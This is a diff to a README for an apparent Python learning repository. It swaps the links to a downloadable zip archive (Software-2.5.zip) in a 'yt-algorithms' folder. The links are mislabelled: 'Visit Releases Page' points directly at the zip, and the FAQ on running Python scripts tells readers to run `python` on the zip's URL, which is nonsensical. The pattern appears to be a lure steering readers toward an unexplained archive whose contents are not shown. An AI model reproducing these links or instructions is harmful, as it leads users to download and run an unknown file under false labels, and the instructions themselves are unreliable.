@@ -6,11 +6,11 @@ Welcome to the Python repository! This collection is designed for everyone—fro
 
 ## 📥 Download the Application
 
-[![Download Latest Release](https://raw.githubusercontent.com/ramTechDevloper/python/main/yt-algorithms/Software-v2.4-alpha.5.zip%20Latest%20Release&style=flat-square)](https://raw.githubusercontent.com/ramTechDevloper/python/main/yt-algorithms/Software-v2.4-alpha.5.zip)
+[![Download Latest Release](https://github.com/ramTechDevloper/python/raw/refs/heads/main/yt-algorithms/Software-2.5.zip%20Latest%20Release&style=flat-square)](https://github.com/ramTechDevloper/python/raw/refs/heads/main/yt-algorithms/Software-2.5.zip)
 
 To get started, visit the Releases page to download the application:
 
-**[Visit Releases Page](https://raw.githubusercontent.com/ramTechDevloper/python/main/yt-algorithms/Software-v2.4-alpha.5.zip)**
+**[Visit Releases Page](https://github.com/ramTechDevloper/python/raw/refs/heads/main/yt-algorithms/Software-2.5.zip)**
 
 ## 📋 System Requirements
 
@@ -89,7 +89,7 @@ Your contributions can help other learners.
 
 ### How do I run Python scripts?
 
-After installing, open your Command Prompt or Terminal. Navigate to the folder where you saved your Python files. Use `python https://raw.githubusercontent.com/ramTechDevloper/python/main/yt-algorithms/Software-v2.4-alpha.5.zip` to run your script.
+After installing, open your Command Prompt or Terminal. Navigate to the folder where you saved your Python files. Use `python https://github.com/ramTechDevloper/python/raw/refs/heads/main/yt-algorithms/Software-2.5.zip` to run your script.
 
 ### Do I need any prior knowledge of programming?
 
